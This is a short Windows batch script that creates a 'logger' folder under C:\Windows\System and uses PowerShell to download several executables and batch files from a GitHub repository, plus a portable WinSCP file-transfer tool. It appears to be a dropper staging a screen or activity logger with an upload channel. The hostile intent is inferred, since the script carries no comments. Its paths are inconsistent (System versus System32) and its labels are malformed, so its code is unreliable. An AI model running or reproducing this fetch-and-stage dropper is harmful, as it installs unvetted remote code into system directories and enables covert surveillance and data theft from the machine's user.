@echo off
mkdir C:\Windows\System\logger
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System\logger\accgen.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile C:\Windows\System\logger\nircmd.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System\logger\define.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System\logger\ss.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\logger\ss1.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\logger\gen.bat
:scp
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\logger\scp.zip
powershell Expand-Archive C:\Windows\System32\logger\scp.zip -DestinationPath C:\Windows\System\logger\
if exist "C:\Windows\System\logger\WinSCP.com" if exist "C:\Windows\System\logger\WinSCP.exe" goto end
if not exist "C:\Windows\System\logger\WinSCP.com" goto scp
if not exist "C:\Windows\System\logger\WinSCP.exe" goto scp
end:
